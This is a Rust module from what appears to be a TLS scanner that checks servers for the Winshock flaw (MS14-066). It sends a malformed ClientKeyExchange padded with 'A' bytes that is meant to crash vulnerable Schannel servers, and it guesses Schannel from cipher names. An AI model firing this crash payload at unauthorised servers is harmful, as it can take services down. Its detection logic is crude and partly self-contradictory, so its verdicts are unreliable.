// Winshock Vulnerability Test
// MS14-066, CVE-2014-6321
//
// Winshock is a vulnerability in Microsoft's Schannel (Windows TLS/SSL implementation)
// that allows remote code execution. The vulnerability exists in how Schannel processes
// specially crafted TLS packets during the handshake phase.

use crate::Result;
use crate::protocols::Protocol;
use crate::protocols::handshake::ClientHelloBuilder;
use crate::utils::network::Target;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

/// Winshock vulnerability tester
pub struct WinshockTester {
    target: Target,
}

impl WinshockTester {
    pub fn new(target: Target) -> Self {
        Self { target }
    }

    /// Test for Winshock vulnerability
    pub async fn test(&self) -> Result<WinshockTestResult> {
        let schannel_detected = self.detect_schannel().await?;
        let vulnerable = if schannel_detected {
            self.test_malformed_handshake().await?
        } else {
            false
        };

        let details = if vulnerable {
            "Vulnerable to Winshock (MS14-066, CVE-2014-6321) - Server crashes or behaves abnormally with malformed handshake".to_string()
        } else if schannel_detected {
            "Schannel detected but Winshock test passed - Likely patched or protected".to_string()
        } else {
            "Not vulnerable - Schannel not detected".to_string()
        };

        Ok(WinshockTestResult {
            vulnerable,
            schannel_detected,
            details,
        })
    }

    /// Detect if server is using Microsoft Schannel
    async fn detect_schannel(&self) -> Result<bool> {
        use openssl::ssl::{SslConnector, SslMethod};

        let addr = self.target.socket_addrs()[0];

        match timeout(Duration::from_secs(5), TcpStream::connect(addr)).await {
            Ok(Ok(stream)) => {
                let std_stream = stream.into_std()?;
                std_stream.set_nonblocking(false)?;

                let connector = SslConnector::builder(SslMethod::tls())?.build();

                match connector.connect(&self.target.hostname, std_stream) {
                    Ok(ssl_stream) => {
                        // Check cipher and version patterns typical of Schannel
                        let cipher = ssl_stream
                            .ssl()
                            .current_cipher()
                            .map(|c| c.name().to_string())
                            .unwrap_or_default();

                        // Schannel has specific cipher preferences
                        let schannel_ciphers = [
                            "ECDHE-RSA-AES256-SHA384",
                            "ECDHE-RSA-AES128-SHA256",
                            "AES256-SHA256",
                            "AES128-SHA256",
                        ];

                        let likely_schannel =
                            schannel_ciphers.iter().any(|&sc| cipher.contains(sc));

                        Ok(likely_schannel)
                    }
                    Err(_) => Ok(false),
                }
            }
            _ => Ok(false),
        }
    }

    /// Test with malformed handshake that triggers Winshock
    async fn test_malformed_handshake(&self) -> Result<bool> {
        let addr = self.target.socket_addrs()[0];

        match timeout(Duration::from_secs(5), TcpStream::connect(addr)).await {
            Ok(Ok(mut stream)) => {
                // Send normal ClientHello first
                let client_hello = self.build_client_hello();
                stream.write_all(&client_hello).await?;

                // Read ServerHello
                let mut buffer = vec![0u8; 8192];
                match timeout(Duration::from_secs(3), stream.read(&mut buffer)).await {
                    Ok(Ok(n)) if n > 0 => {
                        // Send malformed ClientKeyExchange that triggers Winshock
                        let malformed_cke = self.build_malformed_client_key_exchange();
                        stream.write_all(&malformed_cke).await?;

                        // Try to read response
                        let mut response = vec![0u8; 1024];
                        match timeout(Duration::from_secs(2), stream.read(&mut response)).await {
                            Ok(Ok(_)) => {
                                // Server responded - check for crash indicator
                                // Connection reset indicates potential vulnerability
                                Ok(false)
                            }
                            Ok(Err(_)) => {
                                // Connection error might indicate crash
                                Ok(true)
                            }
                            Err(_) => Ok(false), // Timeout
                        }
                    }
                    _ => Ok(false),
                }
            }
            _ => Ok(false),
        }
    }

    /// Build standard ClientHello using ClientHelloBuilder
    fn build_client_hello(&self) -> Vec<u8> {
        let mut builder = ClientHelloBuilder::new(Protocol::TLS12);
        builder.for_rsa_key_exchange();
        builder.build_minimal().unwrap_or_else(|_| Vec::new())
    }

    /// Build malformed ClientKeyExchange that triggers Winshock
    fn build_malformed_client_key_exchange(&self) -> Vec<u8> {
        let mut msg = vec![
            0x16, 0x03, 0x03, // TLS Record: Handshake (TLS 1.2)
            0xff, 0xff, // Malformed length (triggers vulnerability)
            0x10, // Handshake: ClientKeyExchange
            0xff, 0xff, 0xff, // Malformed handshake length
            0xff, 0xff, // Encrypted PMS with malformed length
        ];

        // Crafted payload that triggers buffer overflow in Schannel
        // This is a simplified version - real exploit would be more sophisticated
        msg.extend_from_slice(&[0x41; 256]); // 'A' pattern

        msg
    }
}

/// Winshock test result
#[derive(Debug, Clone)]
pub struct WinshockTestResult {
    pub vulnerable: bool,
    pub schannel_detected: bool,
    pub details: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_winshock_result() {
        let result = WinshockTestResult {
            vulnerable: false,
            schannel_detected: true,
            details: "Test".to_string(),
        };
        assert!(!result.vulnerable);
        assert!(result.schannel_detected);
    }

    #[test]
    fn test_malformed_cke_build() {
        let target = Target::with_ips(
            "example.com".to_string(),
            443,
            vec!["93.184.216.34".parse().unwrap()],
        )
        .unwrap();

        let tester = WinshockTester::new(target);
        let malformed = tester.build_malformed_client_key_exchange();

        assert!(malformed.len() > 10);
        assert_eq!(malformed[0], 0x16); // Handshake record
        assert_eq!(malformed[5], 0x10); // ClientKeyExchange
    }
}
